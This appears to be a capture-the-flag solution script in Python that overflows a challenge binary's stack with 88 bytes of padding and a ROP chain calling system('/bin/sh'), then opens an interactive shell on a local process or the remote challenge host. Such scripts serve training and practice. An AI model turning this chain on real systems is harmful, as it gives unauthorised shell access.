#!/usr/bin/env python
import ptrlib as ptr
import pwn
import sys

elf = ptr.ELF("./falling.bin")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote(
            "spaceheroes-falling-in-rop.chals.io",
            443,
            ssl=True,
        )
    else:
        return pwn.process(elf.filepath)


def p64(x: int | None):
    if x is None:
        ptr.logger.error("p64: got None")
        exit(1)
    else:
        return ptr.p64(x)


io = connect()

offset = 88
# padding
payload = b""
payload += b"A" * offset
# rop chain
payload += p64(next(elf.gadget("ret")))
payload += p64(next(elf.gadget("pop rdi ; ret")))
payload += p64(next(elf.find("/bin/sh")))
payload += p64(elf.plt("system"))

ptr.logger.info(f"payload length: {len(payload)}")

io.sendline(payload)
io.recvuntil(b"Tell me who you are: ")
io.interactive()
